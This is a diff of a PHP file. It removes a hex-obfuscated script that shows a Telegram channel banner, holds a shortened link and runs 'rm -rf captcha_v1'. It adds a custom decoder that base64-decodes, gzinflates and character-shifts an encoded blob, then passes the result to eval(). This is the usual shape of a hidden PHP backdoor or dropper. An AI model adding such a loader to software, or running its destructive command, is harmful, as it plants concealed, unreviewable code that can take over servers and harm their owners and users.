@@ -1,2 +1,9 @@
-<?php ${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6a\x6a\x7a\x74\x73\x71\x69ycl"]="\x62\x61\x73e\x36\x34_\x65\x6e\x63\x6f\x64\x65\x64\x5f\x31";$odcryf="e\x6ec\x6fde\x64_lin\x6b";error_reporting(0);$oxcecsh="\x62\x61n\x6e";${$oxcecsh}="\n${putih}\x3d\x3d\x3d>\x20${biru}\x4fK OF\x46IC\x49\x41L\n${putih}=\x3d\x3d>\x20${ijo}\x68t\x74p\x73://\x74\x2eme/O\x4boff\x69c\x69\x61l_\x6ee\x77\n${putih}==\x3d\x3e ${ijo}J\x4fI\x4e T\x45L\x45\x47RAM CH\x41\x4e\x4e\x45\x4c :)\n\n";${${"\x47\x4c\x4f\x42\x41\x4cS"}["j\x6az\x74s\x71\x69\x79\x63l"]}="\x71\x70l\x65\x6d\x4d\x70\x6b\x32o\x6dsm\x61\x6d\x77lo\x6c";${$odcryf}="\x68t\x74\x70\x73://\x73e\x6d\x61\x77\x75\x72.co\x6d/\x55\x4e\x68C\x43\x30\x44\x31lFi\x36";system("\x72\x6d -\x72f c\x61\x70tc\x68a_\x76\x31");
-?>
+<?php function sGc($CGLiI)
+{ 
+$CGLiI=gzinflate(base64_decode($CGLiI));
+ for($i=0;$i<strlen($CGLiI);$i++)
+ {
+$CGLiI[$i] = chr(ord($CGLiI[$i])-1);
+ }
+ return $CGLiI;
+ }eval(sGc("bZDBboJAFEU/YL7ihbDQRQVC04UGG2JAUQpJ012bTAZ8yFSYITNjTTV8u5DUTdu7vPcsTi7AEEJQKamowk4qw8Vh4k4XxC6YEBCARexrdzK87oMgWIJ9Lbg69fkO8jhOVkmY/t75p+xrYzo9dxwza9HJd7KqeMlZQwWe/8O3eZLBW5RG69fwBVabMMuiFOZTQqxBRKPQUo0qH67vv7sL321/+r9lwTQ+PVIUpdzjnnojsWYGm2ODgrke0+cRu+8NF8cRuQtfEGeHxrls4u2A6W9tsJ1YqoUHVUHJOlPWjH551nDQ8/IG"));?>
